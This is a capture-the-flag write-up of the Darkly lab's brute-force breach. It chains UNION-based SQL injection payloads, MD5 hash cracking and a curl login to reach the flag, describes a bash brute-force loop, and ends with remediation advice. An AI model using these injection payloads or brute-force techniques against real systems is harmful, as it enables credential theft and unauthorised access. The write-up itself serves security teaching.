# 🚩 11 : Brute Force / Weak Credentials

## 📝 Overview

The signin page at `?page=signin` has no rate limiting and no account lockout. Repeated login attempts are allowed indefinitely. The credentials protecting it were stored in a separate database with a weak MD5 hash. We found them using SQL injection on the members page, cracked the hash in seconds, and logged in to get the flag.

## 🔍 The Vulnerability

### No rate limiting

Rate limiting means the server starts blocking or slowing down requests after a certain number of failed login attempts. Without it, an attacker can try thousands of username and password combinations automatically until one works. This is called a brute force attack.

This server has no such protection. You can send as many login attempts as you want with no consequences.

### Weak password storage

The credentials for the signin page were stored in a database called `Member_Brute_Force` with passwords hashed using MD5. As covered in breach 8, MD5 is completely broken for password storage. The password `shadow` was recovered from its hash in under a second on crackstation.net.

### Credentials discoverable via SQL injection

The signin page credentials were not protected by obscurity either. Using SQL injection on the members page — a separate vulnerability covered in its own breach — we were able to query the `Member_Brute_Force` database directly and extract the username and password hash without ever needing to brute force anything.

## 🗄️ How We Found the Password

### What is a database?

A database is like a set of spreadsheets stored on the server. Each spreadsheet is called a table. Each table has columns (like "username" and "password") and rows containing the actual data. The Darkly site uses a database to store everything — members, images, survey votes, and login credentials. All of it sits in MySQL on the server.

### The normal way the signin page works

When you type `admin` and `shadow` into the login form and click Login, the server runs a query like this behind the scenes:

```sql
SELECT * FROM db_default WHERE username='admin' AND password=md5('shadow')
```

It looks up whether that username and password combination exists in the database. If it finds a match, you are logged in.

### What SQL injection gave us

The members search page was vulnerable to SQL injection — meaning we could type our own SQL commands into the search box and the server would run them. This is covered in detail in the SQL injection breach README.

We used this to run queries against other databases on the same server, not just the members one. Think of it like being given access to one filing cabinet in a room but finding that the key also opens every other cabinet in the room.

### Listing all databases

We typed this into the members search box:

```
1 UNION SELECT 1,schema_name FROM information_schema.schemata--
```

`information_schema` is a special hidden database that MySQL maintains automatically. It contains a map of everything on the server — every database, every table, every column. We asked it to list all database names. The results came back as:

```
information_schema
Member_Brute_Force
Member_Sql_Injection
Member_guestbook
Member_images
Member_survey
```

One of them is called `Member_Brute_Force`. That name is a clear hint — it is obviously the database storing the signin credentials.

### Listing the tables inside it

```
1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x4d656d6265725f42727574655f466f726365--
```

The `0x4d656d6265725f42727574655f466f726365` part looks complicated but it is just the text `Member_Brute_Force` written in hexadecimal. We had to write it this way because the site blocks single quotes, and hex values do not need quotes in SQL.

This returned one table: `db_default`.

### Listing the columns

```
1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_schema=0x4d656d6265725f42727574655f466f726365 AND table_name=0x64625f64656661756c74--
```

`0x64625f64656661756c74` is `db_default` in hex. This returned three columns: `id`, `username`, `password`.

### Reading the actual credentials

```
1 UNION SELECT username,password FROM Member_Brute_Force.db_default--
```

This directly selects the `username` and `password` columns from the `db_default` table inside the `Member_Brute_Force` database. The results:

```
root   →  3bf1114a986ba87ed28fc1b5884fc2f8
admin  →  3bf1114a986ba87ed28fc1b5884fc2f8
```

Both accounts share the same password stored as an MD5 hash.

### Cracking the hash

We pasted `3bf1114a986ba87ed28fc1b5884fc2f8` into crackstation.net, which looked it up in a precomputed database of billions of known hashes and returned `shadow` in under a second.

### The key point

We never actually brute forced the login form. We bypassed it entirely by reading the credentials directly out of the database using SQL injection on a completely different page. The "brute force" in the breach name refers to the fact that the login page has no protection against brute forcing — but in practice we found a smarter shortcut through SQL injection.

## 🛠 The Exploit

### Step 1: Find the credentials database via SQL injection

On the members search page at `?page=members`, the search input is vulnerable to SQL injection. We used it to query `information_schema`, which is a special built-in MySQL database that stores metadata about all other databases on the server.

Typing this in the search box returned a list of all databases:

```
1 UNION SELECT 1,schema_name FROM information_schema.schemata--
```

The results included a database called `Member_Brute_Force` — its name makes it obvious this is where the signin credentials live.

### Step 2: Find the table

```
1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x4d656d6265725f42727574655f466f726365--
```

`0x4d656d6265725f42727574655f466f726365` is the string `Member_Brute_Force` written in hexadecimal. We use hex here because the site blocks single quotes, and hex values need no quotes in SQL.

This returned one table: `db_default`.

### Step 3: Find the columns

```
1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_schema=0x4d656d6265725f42727574655f466f726365 AND table_name=0x64625f64656661756c74--
```

`0x64625f64656661756c74` is `db_default` in hex.

This returned three columns: `id`, `username`, `password`.

### Step 4: Dump the credentials

```
1 UNION SELECT username,password FROM Member_Brute_Force.db_default--
```

This returned two rows:

```
username: root      password: 3bf1114a986ba87ed28fc1b5884fc2f8
username: admin     password: 3bf1114a986ba87ed28fc1b5884fc2f8
```

Both accounts share the same password hash.

### Step 5: Crack the hash

We pasted `3bf1114a986ba87ed28fc1b5884fc2f8` into crackstation.net. The result came back instantly:

```
3bf1114a986ba87ed28fc1b5884fc2f8  →  shadow
```

We now had two sets of working credentials: `root/shadow` and `admin/shadow`.

### Step 6: Log in

Visiting `?page=signin` in the browser and entering `admin` / `shadow` returned the flag.

The same flag is also returned when logging in via curl with a fake Referer header:

```bash
curl -s "http://192.168.64.2/?page=signin&username=admin&password=shadow&Login=Login" \
  -H "Referer: hack"
```

Both methods produce the same flag because the server triggers the flag on any successful login regardless of how the request is made.

## 🤖 Alternative Method: Actual Brute Forcing

The method above used SQL injection to find the credentials directly. But the breach is called "brute force" because the login page is also vulnerable to a real brute force attack — trying thousands of passwords automatically until one works. Here is how that works.

### What is brute forcing a login?

A brute force attack against a login form works by taking a list of common passwords and trying each one automatically. Since the server has no rate limiting and no account lockout, it will happily respond to thousands of requests in a row. Eventually one of the passwords in the list matches and we are in.

### The GET method problem

Normally login forms send credentials using the POST method, which keeps them out of the URL. This site uses GET instead, which means the username and password appear directly in the URL:

```
http://192.168.64.2/?page=signin&username=admin&password=shadow&Login=Login
```

This makes brute forcing trivial: you just change the `username` and `password` values in the URL and send the request. No need to construct complex form submissions.

### What files you need

The script needs two text files:

**users.txt**: with one script we create this ourself, with the other we download a list of common usernames online. 

The result is a list that contains the usernames to try, one per line:

```
admin
root
```

Next file: 

**passwords.txt**: either of our scripts downloads it automatically from the internet. It is a list of the most commonly used passwords in the world, compiled by security researchers.

### The brute force script(s)

We have a script saved as `bruteforce.sh` (in the same folder as `users.txt`) and a second 'bruteforce_big.sh' script that does not repy on a pre-existing users.txt file. These are simple bash scripts checking each username and password combination one by one and then printin the result in terminal. Once a match is found, the scripts terminate.

For the record, we went with a short list of usernames and it worked. But here is a more comprehensive list of usernames to test in general: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt

### What each part of the scritp(s) does

We'll go over 'bruteforce.sh' for reference.

`USER_FILE=users.txt` and `PSWD_FILE=passwords.txt` store the filenames in variables so they are easy to change.

`AMOUNT=1000` sets how many passwords to download.

`curl "https://..."` downloads the password list from GitHub's SecLists repository, which is a well-known collection of security wordlists. The `-q` flag means quiet — no progress output. It saves the file as `passwords.txt`.

The two `while` loops work as nested loops — for each username in `users.txt`, try every password in `passwords.txt`. So with 2 usernames and 1000 passwords, the script makes 2000 login attempts.

`curl -s "http://..."` sends the login request. `$user` and `$pass` are the current username and password being tried.


If a match is found, the script prints MATCH! and exits. Otherwise it prints `x` and moves to the next password.

NOTE: we could also have used Burp Suite instead.

### How to run it

```bash
# Step 1: Create the users file
echo -e "admin\nroot" > users.txt

# Step 2: Set your VM's IP address
export IPADDR=192.168.64.2

# Step 3: Make the script executable
chmod +x bruteforce.sh

# Step 4: Run it
./bruteforce.sh
```

The script will print a table showing each attempt. When it hits `admin/shadow` it prints `o` and stops:

```
=================================================================
user            | pass            | match   |
=================================================================
root           | 123456          | x       |
root           | password        | x       |
root           | shadow          | o       |
=================================================================
```

## 🏁 Result

```
FLAG: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## 🌍 Real-World Impact

Weak credentials combined with no rate limiting is one of the most exploited combinations in real attacks. Credential stuffing attacks — where attackers take leaked username/password lists from other breaches and try them against new targets — rely entirely on this. Services with no rate limiting and weak passwords are trivially compromised this way.

The 2016 LinkedIn breach exposed 117 million MD5-hashed passwords. Within days the majority had been cracked and were being used to attack other services where users had reused the same password.

## 🛡️ Remediation Strategies

### Implement rate limiting and account lockout

After a small number of failed login attempts (typically 5-10), the server should either slow down responses, temporarily lock the account, or require a CAPTCHA. This makes automated brute forcing impractical.

### Use strong password hashing

MD5 must never be used for passwords. Use bcrypt, Argon2, or scrypt — algorithms designed to be slow and resistant to brute force. A bcrypt hash takes hundreds of milliseconds to verify, reducing an attacker trying millions of guesses per second down to a few per second.

### Use strong unique passwords

`shadow` is a dictionary word that appears in every common wordlist. Passwords protecting admin accounts should be long, random, and unique — ideally generated by a password manager.

### Do not expose internal database names

The `Member_Brute_Force` database was reachable via SQL injection on a different page entirely. Proper input sanitization on the members search page would have prevented us from ever querying it. SQL injection and brute force are separate vulnerabilities here, but one enabled the other.

### Separate authentication databases from application databases

The credentials database should not be queryable from the same SQL injection surface as the application data. Proper database user permissions would restrict the application's database user to only the tables it actually needs.

## 📊 Attack Chain Summary

```
1. Found members search page vulnerable to SQL injection
2. Queried information_schema to list all databases
3. Found Member_Brute_Force database
4. Extracted db_default table → username and password columns
5. Dumped credentials → root and admin both hashed as 3bf1114a986ba87ed28fc1b5884fc2f8
6. Cracked MD5 hash on crackstation.net → shadow
7. Logged in at ?page=signin with admin/shadow → flag
```